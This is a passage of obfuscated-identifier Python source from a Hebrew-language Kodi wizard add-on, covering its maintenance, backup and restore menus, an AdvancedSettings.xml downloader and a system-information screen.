		O0000O0000O0000OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2413
		if O0000O0000O0000OO :#line:2415
			ADDON .openSettings ()#line:2417
			STARTP2 ()#line:2419
			sys .exit ()#line:2420
		else :#line:2421
			sys .exit ()#line:2422
	return 'ok'#line:2426
def passandpin ():#line:2427
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2428
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2429
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2430
def passandUsername ():#line:2431
	ADDON .openSettings ()#line:2432
def folderback ():#line:2435
    OO00OOO0OO0O000O0 =ADDON .getSetting ("path")#line:2436
    if OO00OOO0OO0O000O0 :#line:2437
      OO00OOO0OO0O000O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2438
      ADDON .setSetting ("path",OO00OOO0OO0O000O0 )#line:2439
def backmyupbuild ():#line:2442
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2446
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2447
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2448
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2450
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2451
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2452
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2454
def maintMenu (view =None ):#line:2458
	O0O0OO0O0OOO0O0O0 ='[B][COLOR green]ON[/COLOR][/B]';O0OOO00O00OOOOOO0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2460
	OOOO0O0O0000OO0OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2461
	OO0O00OO00OOOOO00 ='true'if AUTOCACHE =='true'else 'false'#line:2462
	OO00O000000O0O000 ='true'if AUTOPACKAGES =='true'else 'false'#line:2463
	OOOO00O00OO0O0O0O ='true'if AUTOTHUMBS =='true'else 'false'#line:2464
	O0000O0OO0OOO0OO0 ='true'if SHOWMAINT =='true'else 'false'#line:2465
	OOO0O0O000000OO00 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2466
	O00OO00O0000OO000 ='true'if INCLUDEALL =='true'else 'false'#line:2467
	OO00OO0O000OO0OOO ='true'if THIRDPARTY =='true'else 'false'#line:2468
	if wiz .Grab_Log (True )==False :O000O0O00OO0OOOOO =0 #line:2469
	else :O000O0O00OO0OOOOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2470
	if wiz .Grab_Log (True ,True )==False :OOO0OO0000OOOO00O =0 #line:2471
	else :OOO0OO0000OOOO00O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2472
	O0OOO0OO0OO00O0OO =int (O000O0O00OO0OOOOO )+int (OOO0OO0000OOOO00O )#line:2473
	O0O0OOO000O00O0OO =str (O0OOO0OO0OO00O0OO )+' Error(s) Found'if O0OOO0OO0OO00O0OO >0 else 'None Found'#line:2474
	OO0O00O0O0OOOOOO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2475
	if O00OO00O0000OO000 =='true':#line:2476
		O0OO0OO0OOOO00OOO ='true'#line:2477
		O00O000OOOO0O0O00 ='true'#line:2478
		O00OO0O0000O00O0O ='true'#line:2479
		OO0O0000O0O000OO0 ='true'#line:2480
		O0O00OO0OOOOO00O0 ='true'#line:2481
		O0OO00OO0O000O0OO ='true'#line:2482
		O00OO000OO0O0000O ='true'#line:2483
		OO000O0O000000O0O ='true'#line:2484
	else :#line:2485
		O0OO0OO0OOOO00OOO ='true'if INCLUDEBOB =='true'else 'false'#line:2486
		O00O000OOOO0O0O00 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2487
		O00OO0O0000O00O0O ='true'if INCLUDESPECTO =='true'else 'false'#line:2488
		OO0O0000O0O000OO0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2489
		O0O00OO0OOOOO00O0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2490
		O0OO00OO0O000O0OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2491
		O00OO000OO0O0000O ='true'if INCLUDESALTS =='true'else 'false'#line:2492
		OO000O0O000000O0O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2493
	O0OO00O0O0OOOO0O0 =wiz .getSize (PACKAGES )#line:2494
	O0O00O00OO00OO0O0 =wiz .getSize (THUMBS )#line:2495
	OO000O0O00OOOOO00 =wiz .getCacheSize ()#line:2496
	O0O0O0O0OO0O000O0 =O0OO00O0O0OOOO0O0 +O0O00O00OO00OO0O0 +OO000O0O00OOOOO00 #line:2497
	OOO0O0OOO00O00O0O =['Daily','Always','3 Days','Weekly']#line:2498
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2499
	if view =="clean"or SHOWMAINT =='true':#line:2500
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O0O0OO0O000O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2501
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000O0O00OOOOO00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2502
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO00O0O0OOOO0O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2503
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00O00OO00OO0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2504
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2505
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2506
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2507
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2508
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2509
	if view =="addon"or SHOWMAINT =='false':#line:2510
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2511
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2512
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2513
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2514
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2515
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2516
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2517
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2518
	if view =="misc"or SHOWMAINT =='true':#line:2519
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2520
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2521
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2522
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2523
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2524
		addFile ('View Errors in Log: %s'%(O0O0OOO000O00O0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2525
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2526
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2527
		addFile ('Clear Wizard Log File%s'%OO0O00O0O0OOOOOO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2528
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2529
	if view =="backup"or SHOWMAINT =='true':#line:2530
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2534
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2538
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2539
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2540
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2541
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2542
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2543
	if view =="tweaks"or SHOWMAINT =='true':#line:2544
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2545
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2546
		else :#line:2547
			if os .path .exists (ADVANCED ):#line:2548
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2549
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2550
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2551
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2552
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2553
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2554
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2555
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2556
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2557
	addFile ('Show All Maintenance: %s'%O0000O0OO0OOO0OO0 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2558
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2559
	addFile ('Third Party Wizards: %s'%OO00OO0O000OO0OOO .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2560
	if OO00OO0O000OO0OOO =='true':#line:2561
		O0000OO0000O0000O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2562
		OO0O0000000O00000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2563
		OO000OOO0OO0O0O0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2564
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0000OO0000O0000O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2565
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0000000O00000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2566
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000OOO0OO0O0O0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2567
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2568
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOOO0O0O0000OO0OO .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2569
	if OOOO0O0O0000OO0OO =='true':#line:2570
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOO0O0OOO00O00O0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2571
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0O00OO00OOOOO00 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2572
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00O000000O0O000 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2573
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOO00O00OO0O0O0O .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2574
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2575
	addFile ('Include Video Cache in Clear Cache: %s'%OOO0O0O000000OO00 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2576
	if OOO0O0O000000OO00 =='true':#line:2577
		addFile ('--- Include All Video Addons: %s'%O00OO00O0000OO000 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2578
		addFile ('--- Include Bob: %s'%O0OO0OO0OOOO00OOO .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2579
		addFile ('--- Include Phoenix: %s'%O00O000OOOO0O0O00 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2580
		addFile ('--- Include Specto: %s'%O00OO0O0000O00O0O .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2581
		addFile ('--- Include Exodus: %s'%O0O00OO0OOOOO00O0 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2582
		addFile ('--- Include Salts: %s'%O00OO000OO0O0000O .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2583
		addFile ('--- Include Salts HD Lite: %s'%OO000O0O000000O0O .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2584
		addFile ('--- Include One Channel: %s'%O0OO00OO0O000O0OO .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('--- Include Genesis: %s'%OO0O0000O0O000OO0 .replace ('true',O0O0OO0O0OOO0O0O0 ).replace ('false',O0OOO00O00OOOOOO0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2588
	setView ('files','viewType')#line:2589
def advancedWindow (url =None ):#line:2591
	if not ADVANCEDFILE =='http://':#line:2592
		if url ==None :#line:2593
			OOOO0OO0O00O0O000 =wiz .workingURL (ADVANCEDFILE )#line:2594
			O000O0O00O00OOOO0 =uservar .ADVANCEDFILE #line:2595
		else :#line:2596
			OOOO0OO0O00O0O000 =wiz .workingURL (url )#line:2597
			O000O0O00O00OOOO0 =url #line:2598
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		if os .path .exists (ADVANCED ):#line:2600
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2601
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2602
		if OOOO0OO0O00O0O000 ==True :#line:2603
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2604
			O0000O0O00OOOO0O0 =wiz .openURL (O000O0O00O00OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2605
			O0OO00OOOO0O00OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000O0O00OOOO0O0 )#line:2606
			if len (O0OO00OOOO0O00OO0 )>0 :#line:2607
				for O000OOO000O0O00OO ,O0O0OO0000000OOOO ,url ,OOOOOO00OOO0O0O0O ,OO00OOOO000OO0OO0 ,O0OO0O0OOO000OOOO in O0OO00OOOO0O00OO0 :#line:2608
					if O0O0OO0000000OOOO .lower ()=="yes":#line:2609
						addDir ("[B]%s[/B]"%O000OOO000O0O00OO ,'advancedsetting',url ,description =O0OO0O0OOO000OOOO ,icon =OOOOOO00OOO0O0O0O ,fanart =OO00OOOO000OO0OO0 ,themeit =THEME3 )#line:2610
					else :#line:2611
						addFile (O000OOO000O0O00OO ,'writeadvanced',O000OOO000O0O00OO ,url ,description =O0OO0O0OOO000OOOO ,icon =OOOOOO00OOO0O0O0O ,fanart =OO00OOOO000OO0OO0 ,themeit =THEME2 )#line:2612
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2613
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0OO0O00O0O000 )#line:2614
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2615
def writeAdvanced (O0O00O00O0OOO000O ,OO0O0O00OOO0OOOO0 ):#line:2617
	O00000000OOOO0000 =wiz .workingURL (OO0O0O00OOO0OOOO0 )#line:2618
	if O00000000OOOO0000 ==True :#line:2619
		if os .path .exists (ADVANCED ):O000O0OO00OO0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O00O00O0OOO000O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2620
		else :O000O0OO00OO0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O00O00O0OOO000O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2621
		if O000O0OO00OO0000O ==1 :#line:2623
			OO00OO0O00000O0O0 =wiz .openURL (OO0O0O00OOO0OOOO0 )#line:2624
			OO0O000OO00OOOO0O =open (ADVANCED ,'w');#line:2625
			OO0O000OO00OOOO0O .write (OO00OO0O00000O0O0 )#line:2626
			OO0O000OO00OOOO0O .close ()#line:2627
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2628
			wiz .killxbmc (True )#line:2629
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2630
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00000000OOOO0000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2631
def viewAdvanced ():#line:2633
	O000OO0000O0O0000 =open (ADVANCED )#line:2634
	O0OO0O00O0OO0OOO0 =O000OO0000O0O0000 .read ().replace ('\t','    ')#line:2635
	wiz .TextBox (ADDONTITLE ,O0OO0O00O0OO0OOO0 )#line:2636
	O000OO0000O0O0000 .close ()#line:2637
def removeAdvanced ():#line:2639
	if os .path .exists (ADVANCED ):#line:2640
		wiz .removeFile (ADVANCED )#line:2641
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2642
def showAutoAdvanced ():#line:2644
	notify .autoConfig ()#line:2645
def getIP ():#line:2647
	O00O0OO00OOO00000 ='http://whatismyipaddress.com/'#line:2648
	if not wiz .workingURL (O00O0OO00OOO00000 ):return 'Unknown','Unknown','Unknown'#line:2649
	OO00O0000000OOO00 =wiz .openURL (O00O0OO00OOO00000 ).replace ('\n','').replace ('\r','')#line:2650
	if not 'Access Denied'in OO00O0000000OOO00 :#line:2651
		OOO0OO0000O0OOO00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO00O0000000OOO00 )#line:2652
		OO0O0O0OO0O00O0O0 =OOO0OO0000O0OOO00 [0 ]if (len (OOO0OO0000O0OOO00 )>0 )else 'Unknown'#line:2653
		OOO000O0OOOO0000O =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO00O0000000OOO00 )#line:2654
		OOOO00OO0OO0000O0 =OOO000O0OOOO0000O [0 ]if (len (OOO000O0OOOO0000O )>0 )else 'Unknown'#line:2655
		OO00000OO00O000O0 =OOO000O0OOOO0000O [1 ]+', '+OOO000O0OOOO0000O [2 ]+', '+OOO000O0OOOO0000O [3 ]if (len (OOO000O0OOOO0000O )>2 )else 'Unknown'#line:2656
		return OO0O0O0OO0O00O0O0 ,OOOO00OO0OO0000O0 ,OO00000OO00O000O0 #line:2657
	else :return 'Unknown','Unknown','Unknown'#line:2658
def systemInfo ():#line:2660
	OOO0O00000OOOO000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2674
	O0O000O00OO0O00O0 =[];OOOO000O0OOOO00O0 =0 #line:2675
	for OOOOOOO0OO0000OOO in OOO0O00000OOOO000 :#line:2676
		OO000O0OO0OO0OOOO =wiz .getInfo (OOOOOOO0OO0000OOO )#line:2677
		OO00O0O0000000000 =0 #line:2678
		while OO000O0OO0OO0OOOO =="Busy"and OO00O0O0000000000 <10 :#line:2679
			OO000O0OO0OO0OOOO =wiz .getInfo (OOOOOOO0OO0000OOO );OO00O0O0000000000 +=1 ;wiz .log ("%s sleep %s"%(OOOOOOO0OO0000OOO ,str (OO00O0O0000000000 )));xbmc .sleep (1000 )#line:2680
		O0O000O00OO0O00O0 .append (OO000O0OO0OO0OOOO )#line:2681
		OOOO000O0OOOO00O0 +=1 #line:2682
	OO0O00OOO0000O000 =O0O000O00OO0O00O0 [8 ]if 'Una'in O0O000O00OO0O00O0 [8 ]else wiz .convertSize (int (float (O0O000O00OO0O00O0 [8 ][:-8 ]))*1024 *1024 )#line:2683
	O00OO00O00O0OOOOO =O0O000O00OO0O00O0 [9 ]if 'Una'in O0O000O00OO0O00O0 [9 ]else wiz .convertSize (int (float (O0O000O00OO0O00O0 [9 ][:-8 ]))*1024 *1024 )#line:2684
	OO00O00OOO0000O00 =O0O000O00OO0O00O0 [10 ]if 'Una'in O0O000O00OO0O00O0 [10 ]else wiz .convertSize (int (float (O0O000O00OO0O00O0 [10 ][:-8 ]))*1024 *1024 )#line:2685
	O0OOO000000O000OO =wiz .convertSize (int (float (O0O000O00OO0O00O0 [11 ][:-2 ]))*1024 *1024 )#line:2686
	OOOOOO000O00O00OO =wiz .convertSize (int (float (O0O000O00OO0O00O0 [12 ][:-2 ]))*1024 *1024 )#line:2687
	O0OO00O0OOOO00O0O =wiz .convertSize (int (float (O0O000O00OO0O00O0 [13 ][:-2 ]))*1024 *1024 )#line:2688
	O0OO0OOO000OOO000 ,O000O0OOOOOO0O00O ,OO0OOO000OOOO0O0O =getIP ()#line:2689
	O00000OOO0O0O0O00 =[];OO000OOOO0O000OOO =[];O0O000OO00000O0O0 =[];OO00OO0O00O0OOO00 =[];O00OOOO000000000O =[];O0O0O00OO00O0O00O =[];OO0OO000O000O00OO =[]#line:2691
	OO00OO0000000O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2693
	for OO00OOO0000OOOOO0 in sorted (OO00OO0000000O000 ,key =lambda OO00OOO000000OO00 :OO00OOO000000OO00 ):#line:2694
		O000000O0O00OO000 =os .path .split (OO00OOO0000OOOOO0 [:-1 ])[1 ]#line:2695
		if O000000O0O00OO000 =='packages':continue #line:2696
		OO00OO000OOOOOOO0 =os .path .join (OO00OOO0000OOOOO0 ,'addon.xml')#line:2697
		if os .path .exists (OO00OO000OOOOOOO0 ):#line:2698
			OO0000O00000OO0OO =open (OO00OO000OOOOOOO0 )#line:2699
			O000O00O000OO000O =OO0000O00000OO0OO .read ()#line:2700
			OO0O0O00OOOO0O00O =re .compile ("<provides>(.+?)</provides>").findall (O000O00O000OO000O )#line:2701
			if len (OO0O0O00OOOO0O00O )==0 :#line:2702
				if O000000O0O00OO000 .startswith ('skin'):OO0OO000O000O00OO .append (O000000O0O00OO000 )#line:2703
				if O000000O0O00OO000 .startswith ('repo'):O00OOOO000000000O .append (O000000O0O00OO000 )#line:2704
				else :O0O0O00OO00O0O00O .append (O000000O0O00OO000 )#line:2705
			elif not (OO0O0O00OOOO0O00O [0 ]).find ('executable')==-1 :OO00OO0O00O0OOO00 .append (O000000O0O00OO000 )#line:2706
			elif not (OO0O0O00OOOO0O00O [0 ]).find ('video')==-1 :O0O000OO00000O0O0 .append (O000000O0O00OO000 )#line:2707
			elif not (OO0O0O00OOOO0O00O [0 ]).find ('audio')==-1 :OO000OOOO0O000OOO .append (O000000O0O00OO000 )#line:2708
			elif not (OO0O0O00OOOO0O00O [0 ]).find ('image')==-1 :O00000OOO0O0O0O00 .append (O000000O0O00OO000 )#line:2709
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2711
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2712
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2713
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2714
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2715
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2716
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2718
